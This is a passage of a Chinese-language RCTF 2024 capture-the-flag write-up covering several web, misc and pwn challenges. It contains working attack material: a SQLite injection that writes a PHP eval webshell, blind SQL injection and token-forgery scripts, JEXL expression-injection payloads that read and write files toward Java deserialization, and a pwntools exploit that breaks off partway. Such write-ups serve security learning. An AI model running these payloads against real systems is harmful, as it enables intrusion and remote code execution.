<p>注入点在<code>$ProxyObj-&gt;body</code>(其他地方也可以注入，但是会因为后面的sql语句执行失败，导致无法写入文件)</p>
<p>vps上面放入内容</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;a&#x27;);ATTACH DATABASE &#x27;/var/www/html/shell.php&#x27; AS shell;create TABLE shell.exp (payload text); insert INTO shell.exp (payload) VALUES (&#x27;&lt;?php eval(\$_GET[1]);?&gt;&#x27;);--&quot;</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>修改Host头</p>
<p><img src="../images/2024-05-27-RCTF/86aa97f47c21e02ec270422ab6341c24.png"></p>
<p>访问<code>/shell.php?1=system(&#39;tac flag.php&#39;);</code></p>
<p><img src="../images/2024-05-27-RCTF/c55273600d978e3c1f63652ef1e8013e.png"></p>
<h2><span id="color-solved">color(Solved)</span><a href="#color-solved" class="header-anchor"></a></h2><p>Js反混淆分析</p>
<p><img src="../images/2024-05-27-RCTF/c024ed1135e6e390d941dfa607010b77.png"></p>
<p>先访问js然后f12找到加密解密函数然后打断点之后再访问根目录玩游戏可以看到密钥</p>
<p><img src="../images/2024-05-27-RCTF/a.png"></p>
<p>然后编写脚本玩游戏</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad, unpad</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_data</span>(<span class="params">data, key, iv</span>):</span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    encrypted_data = cipher.encrypt(pad(data.encode(<span class="string">&#x27;utf-8&#x27;</span>), AES.block_size))</span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(encrypted_data).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_data</span>(<span class="params">encrypted_data, key, iv</span>):</span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    decrypted_data = unpad(cipher.decrypt(base64.b64decode(encrypted_data)), AES.block_size)</span><br><span class="line">    <span class="keyword">return</span> decrypted_data.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">post_data</span>(<span class="params">session, url, data</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = session.post(url=url, data=data)</span><br><span class="line">        response.raise_for_status()</span><br><span class="line">        <span class="keyword">return</span> response.text</span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Network error occurred: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    key = <span class="string">b&#x27;88b4dbc541cd57f2d55398e9be3e61ae&#x27;</span></span><br><span class="line">    iv = <span class="string">b&#x27;41cd57f2d55398e9&#x27;</span></span><br><span class="line">    url = <span class="string">&quot;http://124.71.164.28:10088/final/game.php&quot;</span></span><br><span class="line">    session = requests.Session()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">501</span>):</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        encrypted_action = encrypt_data(<span class="string">&quot;4&quot;</span>, key, iv)</span><br><span class="line">        data1 = &#123;</span><br><span class="line">            <span class="string">&quot;action&quot;</span>: <span class="string">&quot;3wrg4Ich1RsKFUUPmU0vlw==&quot;</span>,</span><br><span class="line">            <span class="string">&quot;rangeNum&quot;</span>: encrypted_action</span><br><span class="line">        &#125;</span><br><span class="line">        response_text = post_data(session, url, data1)</span><br><span class="line">        <span class="keyword">if</span> response_text:</span><br><span class="line">            parsed_data = json.loads(response_text)</span><br><span class="line">            pos = decrypt_data(parsed_data[<span class="string">&quot;data&quot;</span>], key, iv)</span><br><span class="line"></span><br><span class="line">            encrypted_pos = encrypt_data(pos, key, iv)</span><br><span class="line">            data2 = &#123;</span><br><span class="line">                <span class="string">&quot;action&quot;</span>: <span class="string">&quot;s03/Zr+K7nTxLc2aiHJQcg==&quot;</span>,</span><br><span class="line">                <span class="string">&quot;pos&quot;</span>: encrypted_pos</span><br><span class="line">            &#125;</span><br><span class="line">            response_text = post_data(session, url, data2)</span><br><span class="line">            <span class="keyword">if</span> response_text:</span><br><span class="line">                parsed_data = json.loads(response_text)</span><br><span class="line">                status = decrypt_data(parsed_data[<span class="string">&quot;data&quot;</span>], key, iv)</span><br><span class="line">                <span class="built_in">print</span>(status)</span><br><span class="line"></span><br><span class="line">    data3 = &#123;</span><br><span class="line">        <span class="string">&quot;action&quot;</span>: <span class="string">&quot;IMYZakV42qGIPRWdg/WfFg==&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    response_text = post_data(session, url, data3)</span><br><span class="line">    <span class="keyword">if</span> response_text:</span><br><span class="line">        <span class="built_in">print</span>(response_text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p><img src="../images/2024-05-27-RCTF/b78bb6863e56b1c86be4bfd3feb0a5d5.png"></p>
<p>解密secret</p>
<p><img src="../images/2024-05-27-RCTF/b78bb6863e56b1c86be4bfd3feb0a5d5.png"></p>
<p>得到源码<code>secr3tcolor.zip</code></p>
<p>下载下来，发现<code>final/game.php</code>中，其中<code>action</code>需要进行加密传送</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$key</span> = <span class="string">&quot;88b4dbc541cd57f2d55398e9be3e61ae&quot;</span>;</span><br><span class="line"><span class="variable">$iv</span> = <span class="string">&quot;41cd57f2d55398e9&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encoder</span>(<span class="params"><span class="variable">$input</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$key</span>,<span class="variable">$iv</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">encrypt</span>(<span class="variable">$input</span>, <span class="variable">$key</span>, <span class="variable">$iv</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span>(<span class="params"><span class="variable">$plaintext</span>, <span class="variable">$key</span>, <span class="variable">$iv</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$encrypted</span> = <span class="title function_ invoke__">openssl_encrypt</span>(<span class="variable">$plaintext</span>, <span class="string">&#x27;aes-256-cbc&#x27;</span>, <span class="variable">$key</span>, OPENSSL_RAW_DATA, <span class="variable">$iv</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$encrypted</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">encoder</span>(<span class="string">&quot;checkImage&quot;</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$upload_image</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;image&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">getimagesize</span>(<span class="variable">$upload_image</span>);</span><br></pre></td></tr></table></figure>

<p>存在侧信道漏洞，但是可控点在文件上传的内容</p>
<p>基于<a href="https://github.com/synacktiv/php_filter_chains_oracle_exploit%E8%84%9A%E6%9C%AC%E8%BF%9B%E8%A1%8C%E4%BF%AE%E6%94%B9">https://github.com/synacktiv/php_filter_chains_oracle_exploit脚本进行修改</a></p>
<p><img src="../images/2024-05-27-RCTF/cabab988fe4d41430594cfc3ae8c6511.png"></p>
<p><img src="../images/2024-05-27-RCTF/7d652a7e19399a3c53683aa792a38bb7.png"></p>
<p>运行即可</p>
<p><code>python3 filters_ chain_ oracle_exploit.py --target url/final/game.php --verb POST --parameter 0 --file /flag.txt</code></p>
<h2><span id="what-is-love-solved"><strong>what_is_love</strong> <strong>(Solved)</strong></span><a href="#what-is-love-solved" class="header-anchor"></a></h2><p>key1进行sql注入，需要前后分开爆，payload不能超过52位</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://1.94.13.174:10088/key1&#x27;</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">list</span>=<span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890-_ &#123;&#125;!@$%&amp;*()#.&quot;</span></span><br><span class="line"><span class="comment">#&#x27; || love_key REGEXP BINARY &#x27;^&#123;&#125;&#x27;#</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">40</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;key1&quot;</span>:<span class="string">&quot;&#x27; || love_key REGEXP BINARY &#x27;&#123;&#125;$&#x27;#&quot;</span>.<span class="built_in">format</span>(j+flag)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">print</span>(data)</span><br><span class="line">        r = requests.post(url, headers=headers, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;success&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag = j+flag</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> j == <span class="string">&#x27;.&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            exit()</span><br></pre></td></tr></table></figure>

<p><img src="../images/2024-05-27-RCTF/c460eab80d6db0ff96dac59993a8ca9e.png"></p>
<p><img src="../images/2024-05-27-RCTF/53f255d839ade35227ea9c02e782517b.png"></p>
<p>key2当输入的love_time为字符串时，先经过Number函数处理之后就会变为NaN，然后再经过parseInt函数处理之后saltedSecret就会变为NaN，所以此时saltedSecret的值可控了，就可以用来伪造token了</p>
<p><img src="../images/2024-05-27-RCTF/c55273600d978e3c1f63652ef1e8013e.png"></p>
<p>伪造token</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">const crypto = require(<span class="string">&quot;crypto&quot;</span>);</span><br><span class="line">const <span class="built_in">hash</span> = (data) =&gt; crypto.createHash(<span class="string">&quot;sha256&quot;</span>).update(data).digest(<span class="string">&quot;hex&quot;</span>);</span><br><span class="line"></span><br><span class="line">data=<span class="string">&quot;&#123;\&quot;username\&quot;:\&quot;lover\&quot;,\&quot;love_time\&quot;:null,\&quot;have_lovers\&quot;:true&#125;&quot;</span></span><br><span class="line">saltedSecret=NaN</span><br><span class="line">console.log(Buffer.<span class="keyword">from</span>(data).toString(<span class="string">&quot;base64&quot;</span>) + <span class="string">&quot;.&quot;</span> + <span class="built_in">hash</span>(`$&#123;data&#125;:$&#123;saltedSecret&#125;`))</span><br></pre></td></tr></table></figure>

<p><img src="../images/2024-05-27-RCTF/25cc211d6b16c26d5e69e44f5042a2fc.png"></p>
<h2><span id="nosandbox">nosandbox</span><a href="#nosandbox" class="header-anchor"></a></h2><p>JEXL 表达式注入 ，BAN 了很多东西<br>根据官方文档 能利用的 只有new 创建新实例，没有T() 类型表达式，而new() 也被ban了，但是可以通过加空格new () 进行绕过</p>
<p><img src="../images/2024-05-27-RCTF/image-20240528103919-7oq843z.png" alt="image"></p>
<p>根据一些之前<code>SpEL表达式注入</code>​ 的 payload ，构造出如下payload读取 <strong>​<code>/proc/self/cmdline</code>​</strong>​</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">expression=<span class="keyword">new</span>+(<span class="string">&#x27;java.util.Scanner&#x27;</span>,<span class="keyword">new</span>+(<span class="string">&#x27;java.io.FileReader&#x27;</span>,<span class="string">&#x27;/proc/self/cmdline&#x27;</span>)).useDelimiter(<span class="string">&#x27;\\Z&#x27;</span>).next()</span><br></pre></td></tr></table></figure>

<p><img src="../images/2024-05-27-RCTF/image-20240528104010-f8x2byk.png" alt="image"></p>
<p>读取<code>nosandbox.jar</code>​ 但因为存在编码问题，无法反编译，但可以看到其依赖</p>
<p><img src="../images/2024-05-27-RCTF/image-20240528104020-d8i3qhc.png" alt="image"></p>
<p>根据**<a href="https://landgrey.me/blog/15/">LandGrey师傅文章</a>** 思路，表达式注入也能打反序列化</p>
<p><img src="../images/2024-05-27-RCTF/image-20240528104029-f0db870.png" alt="image"></p>
<p>但其中调用静态方法 <code>org.springframework.util.SerializationUtils.deserialize</code>​ 反序列化思路，我用 JEXL 表达式我想不出如何能调用，只能去寻找写文件再反序列化读取的方法</p>
<p>看到<a href="https://github.com/achuna33/Memoryshell-JavaALL">Memoryshell-JavaALL</a> 项目发现可以用如下表达式将字符串写入文件</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;<span class="string">&quot;freemarker.template.utility.ObjectConstructor&quot;</span>?<span class="keyword">new</span>()(<span class="string">&quot;java.io.FileWriter&quot;</span>,<span class="string">&quot;/tmp/hh.txt&quot;</span>).append(<span class="string">&quot;&lt;&gt;&quot;</span>).close()&#125;</span><br></pre></td></tr></table></figure>

<p>我一开始是将序列化数据进行Unicode编码成字符串再写入，但是存在写入文件与源文件不一致问题</p>
<p>向调用其他方法，在JEXL 表达式中我也想不出实例化<code>byte[]</code>​ 数组方法，因为<code>[]</code>​ 它会自动执行类型转换</p>
<p><img src="../images/2024-05-27-RCTF/image-20240528104211-b4ois2b.png" alt="image"></p>
<p>通过一番寻找后 终于在<a href="https://docs.oracle.com/javase/8/docs/api/java/io/DataOutputStream.html">官方文档</a> 找到了DataOutputStream.write(int b) 方法，用int 型就能写入数据</p>
<p>一开始用的是jackson原生反序列化这条。链，打了两遍都没成功</p>
<p>遂改用P神的CC6链子</p>
<p><img src="../images/2024-05-27-RCTF/image-20240528104218-n89rt30.png" alt="image"></p>
<p>编写py脚本，写入数据</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">expression = [</span><br><span class="line">    -<span class="number">84</span>,</span><br><span class="line">    -<span class="number">19</span>,</span><br><span class="line">    ...</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送 POST 请求</span></span><br><span class="line">url = <span class="string">&quot;http://124.70.143.104:10088/calculate&quot;</span></span><br><span class="line"><span class="comment"># url = &quot;http://local:10119/calculate&quot;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(expression)):</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;expression&quot;</span>: <span class="string">&quot;new (&#x27;java.io.DataOutputStream&#x27;,(new (&#x27;java.io.FileOutputStream&#x27;,&#x27;/tmp/cc666&#x27;,true))).write(&quot;</span></span><br><span class="line">        + <span class="built_in">str</span>(expression[i])</span><br><span class="line">        + <span class="string">&quot;)&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    response = requests.post(url, data=data, headers=headers)</span><br></pre></td></tr></table></figure>

<p>再用如下payload即可读取文件反序列化</p>
<p><img src="../images/2024-05-27-RCTF/image-20240528104237-t4btbiw.png" alt="image"></p>
<p><img src="../images/2024-05-27-RCTF/image-20240528104241-1htoamp.png" alt="image"></p>
<h1><span id="misc">misc</span><a href="#misc" class="header-anchor"></a></h1><h2><span id="logo-signin-solved">Logo: Signin (Solved)</span><a href="#logo-signin-solved" class="header-anchor"></a></h2><p><img src="../images/2024-05-27-RCTF/e929385cbdd238f4d6d62dcd12872cdb.png"></p>
<p><img src="../images/2024-05-27-RCTF/e1b235340242f6fbb7d46a4c82e6432a.png"></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">logo = &quot;&quot;&quot;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">###################################################################################################</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">########################### # #####################################################################</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">###   ##       ########### ## ##          ###########                   ########             ######</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">###   ##           #########               ##########                   ######                  ###</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">###   ########       ########     ##########################    #############    ############    ##</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">###   ###########     ######    ###########   ##############    ############    ###################</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">##    #############    #####    ###########    #############    ############    ###################</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">##    ##############   ####    #############   #############   #############    ###################</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">##    ##############    ###    #############    ############   ##############     #################</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">##    ##############    ###   ###############   ############   ###############      ###############</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">##    ##############   ####   ###############   ############   #################      #############</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">##    #############    ####   ###############   ###########    ####################      ##########</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">##    ############    #####   ###############   ###########    ######################     #########</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">##    ####           ######   ##############    ###########    ########################     #######</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">##    ####         ########    #############    ###########    ##########################    ######</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">##    #########    #########   #############   ############    ##########################    ######</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">##    ##########    ########    ###########   #############    ##########################    ######</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">##    ###########    ########    #########    #############    #############    #########    ######</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">##    ############   #########     ######   ############       ###############     ####     #######</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">##   ############## ###########         ############                  #########           #########</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">### ###############################  ##############################################    ############</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">###################################################################################################</span></span></span><br><span class="line">&quot;&quot;&quot;</span><br></pre></td></tr></table></figure>

<h2><span id="s1ayth3sp1re-solved">s1ayth3sp1re (Solved)</span><a href="#s1ayth3sp1re-solved" class="header-anchor"></a></h2><p>根据分数 3000 分来，使用jadx反编译. 搜索 3000。在代码中。找到 相关的比较.</p>
<p><img src="../images/2024-05-27-RCTF/bbf3f404a640adef521efd8c4cdfc7ad.png"></p>
<p>跳过去发现 是一段字符串加密:</p>
<p><img src="../images/2024-05-27-RCTF/7da9e6da6a62dedcc190228819151942.png"></p>
<p>其中有一些引用，找到之后，写加密脚本:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">l = [<span class="number">164</span>, <span class="number">158</span>, <span class="number">95</span>, <span class="number">107</span>, <span class="number">4</span>, <span class="number">215</span>, <span class="number">108</span>, <span class="number">115</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">25</span>, <span class="number">57</span>, <span class="number">41</span>, <span class="number">236</span>, <span class="number">231</span>, <span class="number">17</span>, <span class="number">85</span>]</span><br><span class="line">l1 = [<span class="number">246</span>, <span class="number">221</span>, <span class="number">11</span>, <span class="number">45</span>, <span class="number">127</span> , <span class="number">148</span>, <span class="number">45</span>, <span class="number">36</span>, <span class="number">70</span>, <span class="number">73</span>, <span class="number">78</span>, <span class="number">8</span>, <span class="number">98</span>, <span class="number">141</span>, <span class="number">140</span>, <span class="number">112</span>, <span class="number">40</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(l)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(l[i] ^ l1[i]), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># RCTF&#123;********&#125;</span></span><br></pre></td></tr></table></figure>

<h2><span id="sec-image-solved">sec-image （solved ）</span><a href="#sec-image-solved" class="header-anchor"></a></h2><p>光栅</p>
<p>用<a href="https://github.com/AabyssZG/Raster-Terminator%E8%BF%99%E4%B8%AA%E5%B7%A5%E5%85%B7%E5%88%86%E5%88%AB%E5%AF%B9x%E5%92%8Cy%E8%BF%9B%E8%A1%8C%E7%88%86%E7%A0%B4%EF%BC%8Cx%E5%92%8Cy%E9%83%BD%E5%8F%962%E7%9A%84%E9%83%A8%E5%88%86%EF%BC%8C">https://github.com/AabyssZG/Raster-Terminator这个工具分别对x和y进行爆破，x和y都取2的部分，</a></p>
<p>根据前四个字符RCTF分别判断x，y的读取顺序（全是小写，o全部是0）</p>
<h1><span id="pwn">pwn</span><a href="#pwn" class="header-anchor"></a></h1><h2><span id="taskgo-solved">Taskgo (Solved)</span><a href="#taskgo-solved" class="header-anchor"></a></h2><p>go语言的条件竞争，可以通过条件竞争溢出money然后通过GOD功能泄露地址。之后在GOD功能中通过条件竞争修改结构体堆块，从而劫持LOG函数调用的指针为bockdoor读取&#x2F;flag的内容。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = process(<span class="string">&quot;./ctf&quot;</span>)</span><br><span class="line">r = remote(<span class="string">&quot;1.94.107.129&quot;</span>,<span class="number">10088</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./ctf&quot;</span>)</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;terminator&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;sh&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">meau</span>(<span class="params">index</span>):</span><br><span 